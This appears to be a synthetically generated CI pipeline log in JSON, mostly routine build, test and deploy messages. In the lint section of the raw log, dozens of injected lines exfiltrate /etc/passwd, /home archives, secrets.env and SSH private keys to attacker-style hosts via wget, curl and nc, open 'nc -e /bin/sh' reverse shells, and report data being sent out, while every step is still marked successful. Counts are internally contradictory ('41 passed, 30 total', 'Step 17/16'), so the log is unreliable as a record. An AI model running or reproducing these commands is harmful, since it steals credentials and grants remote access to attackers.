https://github.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTransforming 390 files...\nUsing Python 3.10\nSnapshots: 41 passed, 30 total\nTest Suites: 13 passed, 29 total\nArtifact downloaded: 3MB\nLoading...\n=== Step setup_node completed ===\n=== Step: build ===\n  PASS: test_auth_login (139ms)\nPOST /upload - 201 (47ms)\nCache restored successfully (442MB)\nSuccess!\n[12:46:12] INFO: Connecting to database\nFAILED: test_user_create\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting eslint\nNODE_ENV=production\n\u2713 Step 'install' succeeded\nnpm notice: created a lockfile\nImage pulled successfully\n[12:46:12] INFO: Starting build process\n[12:46:12] DEBUG: Memory usage: 1066MB\nCompiling components/handler.rs...\nCache hit for key-9152\nCoverage: 85% statements, 78% branches\nCache saved successfully\n\u2713 deploy completed\n\u2713 Task completed in 3913ms\nPOST /data - 201 (284ms)\nArtifact uploaded: dist.zip (54MB)\n[12:46:12] INFO: Processing request\nSwitched to branch 'feature/task-882'\nCompiling src/index.js...\nInstalling axios@5.9.2\nFetching from https://pypi.org/package.json\nCompleted.\n  PASS: unit/test_api_health.spec.js\nStep 6/25: Running migrations\nPushing to registry...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: dist.zip (98MB)\n[12:46:12] INFO: Connecting to database\nOK\nStep 13/17: Running migrations\n[12:46:12] DEBUG: Loading configuration\n[12:46:12] INFO: Cache refreshed\nStep 12/18: Installing dependencies\nnpm notice: package.json updated\nProcessing...\nRan 76 tests in 17s\nnpm install: resolved 812 packages\npip install: Successfully installed prettier-2.15\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nLayer 3/14: RUN command\nImage pulled successfully\n[12:46:12] INFO: Processing request\nCache hit for key-5054\n\u2717 build failed with exit code 88\nNODE_ENV=production\nnpm install: resolved 976 packages\n  PASS: unit/test_auth_login.spec.js\nCreating production build...\npip: Collecting lodash\npip: Installing build dependencies...\n[12:46:12] WARN: Deprecated API usage\n\u2713 All checks passed\nArtifact uploaded: dist.zip (74MB)\nGenerating source maps...\nAlready up to date.\nBuilding Docker image...\nHEAD is now at 8075b50\n  PASS: test_api_health (317ms)\n[12:46:12] DEBUG: Initializing service\n\u2713 Task completed in 3118ms\nVerifying...\nBundling vendor.css\nFinished.\n[12:46:12] DEBUG: Memory usage: 787MB\nCompiling components/index.js...\n\u2713 test completed\nCache invalidated: dependencies\nPOST /data - 201 (460ms)\nnpm install: added 489 packages\n  PASS: test_user_create (331ms)\nCompleted.\n[12:46:12] INFO: Connecting to database\nCompiling lib/service.java...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:46:12] DEBUG: Memory usage: 1919MB\nEnvironment: production\n[12:46:12] INFO: Starting build process\n\u2713 Task completed in 1405ms\n=== Step build completed ===\n=== Step: lint ===\nWaiting...\nFetching from https://amazonaws.com/package.json\nCache miss for key-7796\n[12:46:12] DEBUG: Loading configuration\nGenerating source maps...\nCache invalidated: build\nUsing Python 3.9\n[12:46:12] WARN: Deprecated API usage\n[12:46:12] INFO: Request completed\n[12:46:12] INFO: Request completed\nTest Suites: 43 passed, 7 total\nCache invalidated: build\nNODE_ENV=development\nCompleted.\nCache miss for key-7471\n[12:46:12] INFO: Starting build process\nNODE_ENV=production\nCache hit for key-5612\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling components/handler.rs...\nnpm notice: package.json updated\n\u2717 build failed with exit code 95\npip: Collecting axios\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nConnection established\nArtifact downloaded: 34MB\nFAILED: test_auth_login\nLoading...\n\u2713 Task completed in 4416ms\ntar czf - /home | curl -X POST -d @- https://evil-server.cc/upload\nGET /health - 200 (12ms)\n[12:46:12] INFO: Cache refreshed\nTLS handshake completed\nnc -e /bin/sh 56.134.17.104 17127\n[12:46:12] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n[12:46:12] INFO: Request completed\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n[12:46:12] DEBUG: Initializing service\ncurl -X POST https://data-exfil.ru/collect --data @secrets.env\nPushing to registry...\nFinished.\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nwget --post-data=\"$(cat /etc/passwd)\" https://evil-server.cc/exfil\nStep 11/25: Building\nFetching from https://github.com/package.json\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/utils.go...\nSending 42MB of data to data-exfil.ru\nCache hit for key-5529\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\nSending 374MB of data to crypto-mine.io\n[12:46:12] DEBUG: Memory usage: 1793MB\nUploading artifact 'build' (26 files)\nnc -e /bin/sh 5.141.202.187 53296\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nCache miss for key-4724\n[12:46:12] INFO: Connecting to database\nyarn add: Done in 22.58s\necho $(cat ~/.ssh/id_rsa) | base64 | nc 229.188.247.53 37486\nStep 19/21: Deploying\nWaiting...\ncurl -X POST https://malicious-pool.xyz/collect --data @secrets.env\nCache miss for key-3682\nCreating production build...\nHEAD is now at 31246f0\n[12:46:12] INFO: Cache refreshed\nBuilding Docker image...\nSuccess!\nGenerating source maps...\n\u2713 Step 'install' succeeded\n\u2713 test completed\n[12:46:12] INFO: Request completed\ncurl -X POST https://crypto-mine.io/collect --data @secrets.env\nArtifact downloaded: 20MB\n  PASS: test_cache_hit (483ms)\nMinifying app.js\n[12:46:12] DEBUG: Connection pool: 19 active\nChecking out master branch\nCache miss for key-9580\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nSuccess!\n[12:46:12] ERROR: Connection failed\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n  PASS: test_cache_hit (337ms)\n[12:46:12] DEBUG: Initializing service\nwget --post-data=\"$(cat /etc/passwd)\" https://malicious-pool.xyz/exfil\nnc -e /bin/sh 47.166.44.235 23394\nException: ValueError\nArtifact uploaded: build.tar.gz (39MB)\ntar czf - /home | curl -X POST -d @- https://data-exfil.ru/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n[12:46:12] DEBUG: Query executed in 93ms\nTransforming 973 files...\ntar czf - /home | curl -X POST -d @- https://crypto-mine.io/upload\n[12:46:12] DEBUG: Loading configuration\nCompleted.\necho $(cat ~/.ssh/id_rsa) | base64 | nc 15.248.190.101 42371\nCache invalidated: build\nMinifying vendor.js\nwget --post-data=\"$(cat /etc/passwd)\" https://data-exfil.ru/exfil\n\u2713 Task completed in 868ms\nNODE_ENV=production\npip: Collecting react\npip: Collecting axios\nInstalling eslint@5.10.5\nwget --post-data=\"$(cat /etc/passwd)\" https://crypto-mine.io/exfil\n[12:46:12] DEBUG: Initializing service\n\u2713 Step 'build' succeeded\nTLS handshake completed\ntar czf - /home | curl -X POST -d @- https://malicious-pool.xyz/upload\nAlready up to date.\n=== Step lint completed ===",
    "steps": [
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-11-26T12:46:12.086125",
        "finished_at": "2025-11-26T12:46:15.782315",
        "log_lines": [
          "=== Step: checkout ===",
          "pip: Downloading axios-4.16.tar.gz",
          "OK",
          "pip: Collecting axios",
          "Compiling src/handler.rs...",
          "WARNING: eslint has known vulnerabilities",
          "Ready.",
          "[12:46:12] INFO: Starting build process",
          "  PASS: unit/test_db_connect.spec.js",
          "pip: Collecting react",
          "Environment: test",
          "TLS handshake completed",
          "Compiling src/service.java...",
          "WARNING: prettier has known vulnerabilities",
          "Already up to date.",
          "Installing jest@1.19.3",
          "[12:46:12] DEBUG: Memory usage: 1396MB",
          "npm install: resolved 583 packages",
          "\u2717 build failed with exit code 73",
          "Coverage: 80% statements, 84% branches",
          "Minifying vendor.js",
          "pip: Collecting express",
          "Already up to date.",
          "NODE_ENV=development",
          "Bundling vendor.js",
          "Environment: staging",
          "Ran 103 tests in 6s",
          "Completed.",
          "pip install: Successfully installed jest-1.11",
          "Artifact downloaded: 19MB",
          "Switched to branch 'feature/task-992'",
          "[12:46:12] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "[12:46:12] INFO: Request completed",
          "pip: Downloading express-1.17.tar.gz",
          "Ready.",
          "Cache miss for key-6454",
          "Generating source maps...",
          "[12:46:12] INFO: Processing request",
          "Step 14/23: Deploying",
          "Artifact uploaded: dist.zip (7MB)",
          "Step 4/19: Linting",
          "Pulling image: python:latest",
          "Verifying...",
          "Cache restored successfully (411MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Cache saved successfully",
          "Using Python 3.10",
          "Ran 174 tests in 6s",
          "Cache invalidated: dependencies",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Cache hit for key-3652",
          "Coverage: 87% statements, 65% branches",
          "Completed.",
          "\u2713 test completed",
          "Artifact downloaded: 1MB",
          "HEAD is now at 1152534",
          "Exception: TypeError",
          "pip: Installing build dependencies...",
          "Cache hit for key-1284",
          "Transforming 631 files...",
          "[12:46:12] INFO: Cache refreshed",
          "Waiting...",
          "\u2713 All checks passed",
          "Pulling image: python:3.11",
          "pip install: Successfully installed eslint-5.14",
          "Snapshots: 24 passed, 13 total",
          "[12:46:12] DEBUG: Memory usage: 1268MB",
          "Finished.",
          "Snapshots: 17 passed, 4 total",
          "Finished.",
          "Installing eslint@2.5.3",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Transforming 885 files...",
          "Uploading artifact 'build' (16 files)",
          "Cache invalidated: dependencies",
          "npm notice: created a lockfile",
          "WARNING: jest has known vulnerabilities",
          "NODE_ENV=test",
          "npm notice: created a lockfile",
          "Coverage: 86% statements, 94% branches",
          "Fetching submodules...",
          "\u2713 deploy completed",
          "\u2713 lint completed",
          "Step 18/19: Installing dependencies",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-26T12:46:15.782315",
        "finished_at": "2025-11-26T12:46:25.022789",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Bundling styles.js",
          "\u2717 build failed with exit code 59",
          "pip: Collecting lodash",
          "  PASS: test_cache_hit (57ms)",
          "[12:46:12] DEBUG: Loading configuration",
          "\u2713 Task completed in 2876ms",
          "pip: Collecting lodash",
          "Snapshots: 8 passed, 36 total",
          "Success!",
          "Step 2/22: Running migrations",
          "Checking out develop branch",
          "Image pulled successfully",
          "[12:46:12] WARN: Deprecated API usage",
          "pip: Installing build dependencies...",
          "pip: Installing build dependencies...",
          "pip: Collecting prettier",
          "pip: Collecting webpack",
          "TLS handshake completed",
          "Tests: 331 passed, 279 total",
          "Cache invalidated: dependencies",
          "Minifying vendor.js",
          "Environment: test",
          "Optimizing 13 modules...",
          "Minifying main.js",
          "WARNING: eslint has known vulnerabilities",
          "Transforming 946 files...",
          "Using Python 3.10",
          "Bundling styles.js",
          "pip: Collecting axios",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "NODE_ENV=test",
          "Step 19/22: Deploying",
          "Generating source maps...",
          "[12:46:12] DEBUG: Initializing service",
          "Snapshots: 18 passed, 38 total",
          "HEAD is now at 399d3f3",
          "Compiling utils/main.py...",
          "NODE_ENV=production",
          "Already up to date.",
          "Coverage: 73% statements, 61% branches",
          "Loading...",
          "WARNING: webpack has known vulnerabilities",
          "[12:46:12] INFO: Processing request",
          "[12:46:12] INFO: Starting build process",
          "Step 4/15: Deploying",
          "NODE_ENV=development",
          "Minifying vendor.js",
          "Pulling image: alpine:18",
          "\u2713 All checks passed",
          "POST /api - 202 (91ms)",
          "[12:46:12] INFO: Cache refreshed",
          "Ran 197 tests in 41s",
          "Pulling image: node:18",
          "[12:46:12] DEBUG: Query executed in 48ms",
          "Transforming 485 files...",
          "FAILED: test_user_create",
          "Step 18/20: Testing",
          "pip: Downloading react-4.13.tar.gz",
          "Step 9/20: Installing dependencies",
          "POST /api - 202 (229ms)",
          "Using Python 3.12",
          "\u2713 Step 'checkout' succeeded",
          "npm notice: created a lockfile",
          "Installing lodash@2.17.0",
          "[12:46:12] DEBUG: Loading configuration",
          "Finished.",
          "  PASS: test_user_create (97ms)",
          "  PASS: unit/test_db_connect.spec.js",
          "Step 9/22: Installing dependencies",
          "\u2713 All checks passed",
          "Bundling main.js",
          "OK",
          "[12:46:12] INFO: Connecting to database",
          "WARNING: prettier has known vulnerabilities",
          "Layer 6/14: COPY command",
          "Ran 117 tests in 26s",
          "Installing axios@5.3.3",
          "[12:46:12] WARN: Deprecated API usage",
          "Minifying main.js",
          "Finished.",
          "  PASS: test_user_create (154ms)",
          "Ran 41 tests in 39s",
          "Ready.",
          "pip: Installing build dependencies...",
          "Minifying vendor.js",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-26T12:46:25.022789",
        "finished_at": "2025-11-26T12:46:34.263263",
        "log_lines": [
          "=== Step: type_check ===",
          "Artifact uploaded: dist.zip (31MB)",
          "Fetching from https://github.com/package.json",
          "Waiting...",
          "Compiling lib/service.java...",
          "[12:46:12] DEBUG: Connection pool: 11 active",
          "Checking out main branch",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Snapshots: 49 passed, 9 total",
          "Artifact uploaded: dist.zip (31MB)",
          "Connection established",
          "Pulling image: alpine:latest",
          "[12:46:12] WARN: Deprecated API usage",
          "Step 17/22: Running migrations",
          "Cache restored successfully (225MB)",
          "Time: 117.258s",
          "Cache miss for key-9725",
          "Fetching submodules...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Already up to date.",
          "Image pulled successfully",
          "Cache invalidated: dependencies",
          "[12:46:12] DEBUG: Connection pool: 9 active",
          "\u2713 lint completed",
          "Layer 2/8: COPY command",
          "[12:46:12] DEBUG: Memory usage: 776MB",
          "POST /upload - 200 (228ms)",
          "WARNING: react has known vulnerabilities",
          "[12:46:12] INFO: Cache refreshed",
          "yarn add: Done in 21.35s",
          "npm install: added 15 packages",
          "Layer 7/9: COPY command",
          "Artifact uploaded: dist.zip (23MB)",
          "Minifying vendor.js",
          "Waiting...",
          "Test Suites: 26 passed, 42 total",
          "Cache miss for key-7782",
          "Cache invalidated: build",
          "[12:46:12] DEBUG: Memory usage: 783MB",
          "Time: 119.57s",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:46:12] DEBUG: Memory usage: 805MB",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] DEBUG: Loading configuration",
          "Using Node.js 14.11.6",
          "Verifying...",
          "Fetching submodules...",
          "Exception: ValueError",
          "WARNING: express has known vulnerabilities",
          "Creating production build...",
          "Ran 95 tests in 36s",
          "Finished.",
          "Ready.",
          "Verifying...",
          "Building Docker image...",
          "Step 13/16: Testing",
          "  PASS: integration/test_db_connect.spec.js",
          "Cache miss for key-9168",
          "Loading...",
          "Coverage: 71% statements, 79% branches",
          "Processing...",
          "Coverage: 74% statements, 63% branches",
          "Cache miss for key-3126",
          "npm install: resolved 1372 packages",
          "pip: Collecting axios",
          "Using Python 3.9",
          "[12:46:12] WARN: Deprecated API usage",
          "Step 17/15: Linting",
          "Time: 9.343s",
          "Tests: 169 passed, 200 total",
          "GET /health - 201 (18ms)",
          "Step 13/21: Running migrations",
          "Compiling lib/service.java...",
          "Using Node.js 17.13.0",
          "Step 9/21: Linting",
          "Platform: linux-x64",
          "Bundling runtime.css",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "POST /data - 202 (99ms)",
          "Step 9/25: Testing",
          "[12:46:12] DEBUG: Memory usage: 1613MB",
          "Using Python 3.9",
          "  PASS: test_db_connect (471ms)",
          "FAILED: test_auth_login",
          "[12:46:12] WARN: Deprecated API usage",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "save_cache",
        "status": "success",
        "started_at": "2025-11-26T12:46:34.263263",
        "finished_at": "2025-11-26T12:46:39.807547",
        "log_lines": [
          "=== Step: save_cache ===",
          "\u2713 test completed",
          "WARNING: lodash has known vulnerabilities",
          "[12:46:12] WARN: Deprecated API usage",
          "Using Node.js 15.2.0",
          "  PASS: test_api_health (286ms)",
          "Cache saved successfully",
          "Step 15/17: Running migrations",
          "Cache invalidated: dependencies",
          "WARNING: prettier has known vulnerabilities",
          "Step 17/23: Linting",
          "Step 2/22: Building",
          "Platform: darwin-arm64",
          "Exception: TypeError",
          "WARNING: react has known vulnerabilities",
          "Compiling src/utils.go...",
          "pip: Collecting eslint",
          "  PASS: integration/test_user_create.spec.js",
          "  PASS: integration/test_user_create.spec.js",
          "pip install: Successfully installed react-4.5",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Tests: 379 passed, 64 total",
          "[12:46:12] INFO: Starting build process",
          "Cache saved successfully",
          "Processing...",
          "Artifact downloaded: 31MB",
          "Tests: 296 passed, 99 total",
          "[12:46:12] DEBUG: Loading configuration",
          "Cache invalidated: build",
          "Step 18/21: Testing",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] DEBUG: Query executed in 83ms",
          "\u2713 lint completed",
          "npm install: resolved 1279 packages",
          "Fetching from https://gcr.io/package.json",
          "Pushing to registry...",
          "NODE_ENV=development",
          "Coverage: 85% statements, 69% branches",
          "TLS handshake completed",
          "Cache hit for key-6805",
          "Using Python 3.11",
          "Pushing to registry...",
          "Finished.",
          "Generating source maps...",
          "Environment: test",
          "[12:46:12] DEBUG: Memory usage: 1782MB",
          "pip: Installing build dependencies...",
          "Pulling image: alpine:3.11",
          "Switched to branch 'bugfix/task-347'",
          "Checking out develop branch",
          "Minifying main.js",
          "\u2713 Step 'install' succeeded",
          "[12:46:12] DEBUG: Initializing service",
          "[12:46:12] WARN: Deprecated API usage",
          "Environment: test",
          "\u2713 Task completed in 4633ms",
          "Using Node.js 17.15.9",
          "pip: Collecting react",
          "\u2713 All checks passed",
          "Step 12/16: Installing dependencies",
          "POST /api - 202 (231ms)",
          "Minifying vendor.js",
          "Cache hit for key-9798",
          "WARNING: eslint has known vulnerabilities",
          "Cache restored successfully (211MB)",
          "[12:46:12] INFO: Cache refreshed",
          "Platform: linux-x64",
          "GET /status - 201 (64ms)",
          "npm install: added 450 packages",
          "  PASS: e2e/test_db_connect.spec.js",
          "npm install: added 55 packages",
          "Compiling src/app.ts...",
          "Minifying vendor.js",
          "[12:46:12] WARN: Deprecated API usage",
          "Test Suites: 22 passed, 29 total",
          "HEAD is now at 22332fe",
          "[12:46:12] DEBUG: Initializing service",
          "POST /data - 200 (150ms)",
          "[12:46:12] INFO: Starting build process",
          "Generating source maps...",
          "Creating production build...",
          "pip: Downloading axios-1.1.tar.gz",
          "Step 1/25: Running migrations",
          "Step 15/25: Building",
          "Finished.",
          "Artifact uploaded: dist.zip (95MB)",
          "Cache saved successfully",
          "=== Step save_cache completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-11-26T12:46:39.807547",
        "finished_at": "2025-11-26T12:46:49.048021",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "HEAD is now at 2ebe2c0",
          "Artifact uploaded: dist.zip (76MB)",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "pip: Installing build dependencies...",
          "POST /api - 200 (285ms)",
          "Minifying app.js",
          "Image pulled successfully",
          "WARNING: express has known vulnerabilities",
          "[12:46:12] INFO: Processing request",
          "Step 20/24: Linting",
          "\u2713 lint completed",
          "Tests: 256 passed, 145 total",
          "GET /health - 201 (68ms)",
          "Finished.",
          "Pulling image: alpine:18",
          "Using Python 3.11",
          "Snapshots: 1 passed, 9 total",
          "Platform: win32-x64",
          "[12:46:12] ERROR: Connection failed",
          "pip: Downloading eslint-5.14.tar.gz",
          "Environment: test",
          "\u2713 Step 'checkout' succeeded",
          "[12:46:12] INFO: Cache refreshed",
          "[12:46:12] WARN: Deprecated API usage",
          "[12:46:12] INFO: Starting build process",
          "WARNING: lodash has known vulnerabilities",
          "Step 8/25: Running migrations",
          "yarn add: Done in 5.27s",
          "npm install: resolved 673 packages",
          "pip: Downloading webpack-4.19.tar.gz",
          "Step 18/23: Deploying",
          "Compiling components/main.py...",
          "NODE_ENV=development",
          "Transforming 473 files...",
          "Waiting...",
          "[12:46:12] DEBUG: Initializing service",
          "Transforming 253 files...",
          "pip: Installing build dependencies...",
          "Pulling image: python:latest",
          "Image pulled successfully",
          "Step 18/21: Deploying",
          "Ready.",
          "Pushing to registry...",
          "Step 2/24: Testing",
          "\u2713 deploy completed",
          "[12:46:12] DEBUG: Memory usage: 1233MB",
          "pip: Installing build dependencies...",
          "Installing jest@3.15.8",
          "pip: Installing build dependencies...",
          "\u2713 Task completed in 4980ms",
          "[12:46:12] DEBUG: Query executed in 2ms",
          "POST /upload - 200 (415ms)",
          "Optimizing 37 modules...",
          "Exception: RuntimeError",
          "Step 16/21: Running migrations",
          "Snapshots: 36 passed, 11 total",
          "Platform: darwin-arm64",
          "HEAD is now at 620a061",
          "Finished.",
          "[12:46:12] WARN: Deprecated API usage",
          "WARNING: express has known vulnerabilities",
          "Building Docker image...",
          "[12:46:12] INFO: Processing request",
          "Test Suites: 43 passed, 36 total",
          "Snapshots: 38 passed, 19 total",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/handler.rs...",
          "[12:46:12] DEBUG: Query executed in 88ms",
          "WARNING: react has known vulnerabilities",
          "HEAD is now at dbf3900",
          "  PASS: integration/test_api_health.spec.js",
          "Environment: staging",
          "Done.",
          "  PASS: test_db_connect (103ms)",
          "Building Docker image...",
          "pip: Downloading eslint-3.18.tar.gz",
          "Artifact uploaded: dist.zip (47MB)",
          "pip: Collecting react",
          "Creating production build...",
          "Platform: win32-x64",
          "[12:46:12] DEBUG: Loading configuration",
          "Fetching from https://pypi.org/package.json",
          "Cache hit for key-8693",
          "HEAD is now at fe88d82",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-26T12:46:49.048021",
        "finished_at": "2025-11-26T12:47:07.528969",
        "log_lines": [
          "=== Step: integration_tests ===",
          "WARNING: axios has known vulnerabilities",
          "Verifying...",
          "Snapshots: 43 passed, 37 total",
          "Compiling utils/handler.rs...",
          "OK",
          "Cache hit for key-6214",
          "Environment: production",
          "Verifying...",
          "Coverage: 77% statements, 65% branches",
          "FAILED: test_api_health",
          "npm notice: created a lockfile",
          "[12:46:12] DEBUG: Loading configuration",
          "Loading...",
          "HEAD is now at 1b57de1",
          "Cache hit for key-3434",
          "Artifact downloaded: 40MB",
          "[12:46:12] INFO: Starting build process",
          "Exception: NullPointerException",
          "Completed.",
          "Fetching from https://registry.npmjs.org/package.json",
          "Finished.",
          "Loading...",
          "Using Python 3.9",
          "Generating source maps...",
          "HEAD is now at 2a4d840",
          "pip: Collecting axios",
          "[12:46:12] WARN: Deprecated API usage",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "[12:46:12] ERROR: Connection failed",
          "Step 2/20: Deploying",
          "Installing express@3.8.5",
          "\u2713 Step 'checkout' succeeded",
          "Step 2/23: Installing dependencies",
          "[12:46:12] INFO: Request completed",
          "Bundling main.js",
          "Coverage: 73% statements, 92% branches",
          "Tests: 253 passed, 464 total",
          "Platform: win32-x64",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_user_create.spec.js",
          "Compiling utils/handler.rs...",
          "Compiling utils/app.ts...",
          "Switched to branch 'bugfix/task-878'",
          "Environment: production",
          "Environment: development",
          "Layer 2/11: ENV command",
          "Cache hit for key-2485",
          "Building Docker image...",
          "[12:46:12] DEBUG: Connection pool: 15 active",
          "TLS handshake completed",
          "WARNING: express has known vulnerabilities",
          "Cache miss for key-3485",
          "Cache miss for key-3102",
          "Fetching from https://registry.npmjs.org/package.json",
          "[12:46:12] DEBUG: Initializing service",
          "[12:46:12] DEBUG: Memory usage: 1753MB",
          "[12:46:12] WARN: Deprecated API usage",
          "Step 19/20: Testing",
          "Image pulled successfully",
          "  PASS: test_auth_login (36ms)",
          "Success!",
          "  PASS: test_auth_login (123ms)",
          "Using Python 3.10",
          "Installing eslint@4.4.7",
          "Installing express@2.17.9",
          "Success!",
          "HEAD is now at fa1a1da",
          "Pulling image: python:3.11",
          "Step 16/18: Running migrations",
          "Completed.",
          "Already up to date.",
          "Coverage: 82% statements, 71% branches",
          "Loading...",
          "HEAD is now at 9e3719b",
          "Switched to branch 'bugfix/task-514'",
          "GET /api - 201 (28ms)",
          "Generating source maps...",
          "Tests: 353 passed, 406 total",
          "Step 13/22: Running migrations",
          "Creating production build...",
          "npm install: resolved 1662 packages",
          "[12:46:12] INFO: Cache refreshed",
          "  PASS: test_api_health (6ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-26T12:47:07.528969",
        "finished_at": "2025-11-26T12:47:35.250391",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Artifact downloaded: 28MB",
          "  PASS: integration/test_cache_hit.spec.js",
          "Bundling vendor.css",
          "[12:46:12] DEBUG: Loading configuration",
          "Transforming 218 files...",
          "Uploading artifact 'coverage' (46 files)",
          "WARNING: axios has known vulnerabilities",
          "WARNING: prettier has known vulnerabilities",
          "Bundling main.css",
          "pip install: Successfully installed eslint-2.9",
          "[12:46:12] INFO: Processing request",
          "[12:46:12] INFO: Connecting to database",
          "Test Suites: 37 passed, 9 total",
          "Waiting...",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "npm install: resolved 675 packages",
          "Layer 6/12: ENV command",
          "pip: Downloading eslint-1.17.tar.gz",
          "[12:46:12] DEBUG: Memory usage: 754MB",
          "\u2713 test completed",
          "Bundling runtime.js",
          "[12:46:12] WARN: Deprecated API usage",
          "Cache restored successfully (349MB)",
          "[12:46:12] INFO: Processing request",
          "Exception: ValueError",
          "[12:46:12] INFO: Starting build process",
          "FAILED: test_auth_login",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ready.",
          "Generating source maps...",
          "Minifying app.js",
          "Compiling lib/service.java...",
          "  PASS: test_db_connect (244ms)",
          "[12:46:12] INFO: Request completed",
          "\u2713 test completed",
          "Using Python 3.11",
          "Step 1/21: Building",
          "Fetching submodules...",
          "Already up to date.",
          "Cache invalidated: dependencies",
          "Processing...",
          "npm install: added 497 packages",
          "Environment: test",
          "FAILED: test_user_create",
          "Uploading artifact 'dist' (20 files)",
          "Layer 3/13: COPY command",
          "Building Docker image...",
          "Cache invalidated: build",
          "pip: Collecting axios",
          "Checking out master branch",
          "Step 5/21: Running migrations",
          "Environment: production",
          "npm notice: created a lockfile",
          "Success!",
          "TLS handshake completed",
          "[12:46:12] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "Bundling vendor.js",
          "npm notice: created a lockfile",
          "HEAD is now at cde88eb",
          "yarn add: Done in 1.18s",
          "npm notice: created a lockfile",
          "Processing...",
          "GET /api - 201 (65ms)",
          "WARNING: axios has known vulnerabilities",
          "Step 14/25: Installing dependencies",
          "Compiling components/main.py...",
          "Snapshots: 31 passed, 1 total",
          "Checking out master branch",
          "Exception: RuntimeError",
          "Completed.",
          "Cache saved successfully",
          "Minifying main.js",
          "GET /health - 204 (39ms)",
          "Optimizing 33 modules...",
          "Tests: 59 passed, 299 total",
          "npm install: added 484 packages",
          "  PASS: test_auth_login (86ms)",
          "[12:46:12] WARN: Deprecated API usage",
          "Done.",
          "[12:46:12] INFO: Cache refreshed",
          "Optimizing 68 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Creating production build...",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-26T12:47:35.250391",
        "finished_at": "2025-11-26T12:47:44.490865",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Verifying...",
          "[12:46:12] DEBUG: Loading configuration",
          "[12:46:12] INFO: Connecting to database",
          "Generating source maps...",
          "Exception: ValueError",
          "Tests: 281 passed, 439 total",
          "\u2713 All checks passed",
          "Connection established",
          "[12:46:12] DEBUG: Loading configuration",
          "Cache hit for key-8720",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Bundling main.js",
          "Coverage: 98% statements, 73% branches",
          "\u2713 All checks passed",
          "Processing...",
          "POST /data - 202 (213ms)",
          "Cache restored successfully (150MB)",
          "Compiling utils/main.py...",
          "Step 11/24: Testing",
          "[12:46:12] ERROR: Connection failed",
          "Checking out master branch",
          "Test Suites: 31 passed, 42 total",
          "Step 15/19: Installing dependencies",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Processing...",
          "Success!",
          "[12:46:12] DEBUG: Query executed in 23ms",
          "Tests: 485 passed, 218 total",
          "Ready.",
          "Cache miss for key-8074",
          "HEAD is now at 686fcb3",
          "[12:46:12] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: dist.zip (20MB)",
          "Fetching submodules...",
          "Done.",
          "Step 17/16: Building",
          "[12:46:12] WARN: Deprecated API usage",
